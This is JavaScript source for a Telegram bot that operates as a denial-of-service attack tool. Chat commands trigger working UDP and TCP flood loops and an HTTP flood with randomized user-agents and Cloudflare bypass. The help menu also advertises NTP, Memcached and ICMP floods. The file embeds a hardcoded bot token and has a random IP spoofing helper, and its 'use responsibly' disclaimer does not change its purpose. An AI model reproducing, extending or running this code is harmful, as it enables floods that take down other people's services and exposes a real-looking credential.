  const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const cloudscraper = require('cloudscraper');
const socks = require('socks');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { URL } = require('url');
const token = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(token, { polling: true });
const C2_HOST = "localhost";
const C2_PORT = 5511;
const baseUserAgents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f',
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
];
function randomUA() {
    const chosenUA = baseUserAgents[Math.floor(Math.random() * baseUserAgents.length)];
    return chosenUA
        .replace('%.1f', (Math.random() + 5).toFixed(1))
        .replace('%.1f', (Math.random() + Math.floor(Math.random() * 8) + 1).toFixed(1))
        .replace('%.1f', Math.random().toFixed(1))
        .replace('%d0%d', `${Math.floor(Math.random() * 100) + 2000}`)
        .replace('%.1f', (Math.random() + Math.floor(Math.random() * 6) + 3).toFixed(1))
        .replace('{0}', (Math.random() * 5 + 5).toFixed(1));
}

function spoofer() {
    return `${Math.floor(Math.random() * 186) + 11}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 252) + 2}`;
}
const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '💣 UDP Attack' }, { text: '🔌 TCP Attack' }],
            [{ text: '🌪️ HTTP Attacks' }, { text: '❄️ NTP Attack' }],
            [{ text: '🧠 MEM Attack' }, { text: '📡 ICMP Attack' }],
            [{ text: '🛡️ Advanced' }, { text: 'ℹ️ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};
const httpMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🌪️ HTTP Storm' }, { text: '🔄 HTTP GET' }],
            [{ text: '🛡️ HTTP CFB' }, { text: '👤 HTTP Spoof' }],
            [{ text: '⚡ HTTP IO' }, { text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};
const advancedMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🎮 Roblox' }, { text: '🖥️ VSE' }],
            [{ text: '📦 JUNK' }, { text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '👸 HAI KAK LORDHOZOO SELAMAT DATANG DI DDOS ATTACK ', mainMenu);
});
bot.onText(/🔙 Back/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🔙 Returning to main menu:', mainMenu);
});
bot.onText(/🌪️ HTTP Attacks/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🌪️ Select HTTP attack method:', httpMenu);
});
bot.onText(/🛡️ Advanced/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🛡️ Advanced attack methods:', advancedMenu);
});
bot.onText(/💣 UDP Attack/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '💣 UDP Attack\n\nUsage: /udp <ip> <port> <time> <size> <threads>\nExample: /udp 1.1.1.1 80 60 1024 5');
});
bot.onText(/🔌 TCP Attack/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🔌 TCP Attack\n\nUsage: /tcp <ip> <port> <time> <size> <threads>\nExample: /tcp 1.1.1.1 80 60 1024 5');
});
bot.onText(/🌪️ HTTP Storm/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '🌪️ HTTP Storm\n\nUsage: /httpstorm <url> <port> <time> <threads>\nExample: /httpstorm https://example.com 80 60 5');
});
bot.onText(/\/udp (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 5) {
        return bot.sendMessage(chatId, '❌ Invalid parameters. Usage: /udp <ip> <port> <time> <size> <threads>');
    }
    const [ip, port, time, size, threads] = params;
    bot.sendMessage(chatId, `🚀 Starting UDP attack on ${ip}:${port} for ${time} seconds with ${threads} threads`);
    for (let i = 0; i < threads; i++) {
        attackUDP(ip, parseInt(port), parseInt(time), parseInt(size));
    }
});
bot.onText(/\/tcp (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 5) {
        return bot.sendMessage(chatId, '❌ Invalid parameters. Usage: /tcp <ip> <port> <time> <size> <threads>');
    }
    const [ip, port, time, size, threads] = params;
    bot.sendMessage(chatId, `🚀 Starting TCP attack on ${ip}:${port} for ${time} seconds with ${threads} threads`);
    for (let i = 0; i < threads; i++) {
        attackTCP(ip, parseInt(port), parseInt(time), parseInt(size));
    }
});
bot.onText(/\/httpstorm (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 4) {
        return bot.sendMessage(chatId, '❌ Invalid parameters. Usage: /httpstorm <url> <port> <time> <threads>');
    }
    const [url, port, time, threads] = params;
    bot.sendMessage(chatId, `🌪️ Starting HTTP Storm on ${url}:${port} for ${time} seconds with ${threads} threads`);
    for (let i = 0; i < threads; i++) {
        httpStorm(url, port, parseInt(time));
    }
});
async function attackUDP(ip, port, time, size) {
    const endTime = Date.now() + time * 1000;
    while (Date.now() < endTime) {
        try {
            const socket = require('dgram').createSocket('udp4');
            const data = Buffer.alloc(size, Math.random().toString(36).substring(2));
            const dport = port === 0 ? Math.floor(Math.random() * 65535) + 1 : port;
            
            socket.send(data, 0, data.length, dport, ip, (err) => {
                if (err) socket.close();
            });
            
            setTimeout(() => socket.close(), 5000);
        } catch (e) {
        }
    }
}
async function attackTCP(ip, port, time, size) {
    const endTime = Date.now() + time * 1000;
    while (Date.now() < endTime) {
        try {
            const net = require('net');
            const socket = new net.Socket();
            socket.connect(port, ip, () => {
                const data = Buffer.alloc(size, Math.random().toString(36).substring(2));
                socket.write(data);
            });
            socket.on('error', () => socket.destroy());
            setTimeout(() => socket.destroy(), 5000);
        } catch (e) {
        }
    }
}
async function httpStorm(url, port, time) {
    const endTime = Date.now() + time * 1000;
    const target = `${url}:${port}`;
    while (Date.now() < endTime) {
        try {
            const headers = { 'User-Agent': randomUA() };
            await axios.get(target, { headers });
            await axios.head(target, { headers });
            await cloudscraper.get(target, { headers });
        } catch (e) {
        }
    }
}
bot.onText(/ℹ️ Help/, (msg) => {
    const chatId = msg.chat.id;
    const helpText = `🆘 *Bot Help* 🆘
*MENU KAK LORDHOZOO IMUT :*
💣 UDP Attack - Flood target with UDP packets
🔌 TCP Attack - Flood target with TCP connections
🌪️ HTTP Attacks - Various HTTP flood methods
❄️ NTP Attack - NTP amplification attack
👸 MEM Attack - Memcached amplification attack
📡 ICMP Attack - Ping flood attack
🛡️ Advanced - Specialized attack methods

*👸KAK CONTOH DI BAWAH :👸*
/udp <ip> <port> <time> <size> <threads>
/tcp <ip> <port> <time> <size> <threads>
/httpstorm <url> <port> <time> <threads>
⚠️ Use responsibly and only on authorized targets.`;
    bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
});
bot.on('polling_error', (error) => {
    console.log(error);
});
console.log('🤖 Bot is running...');
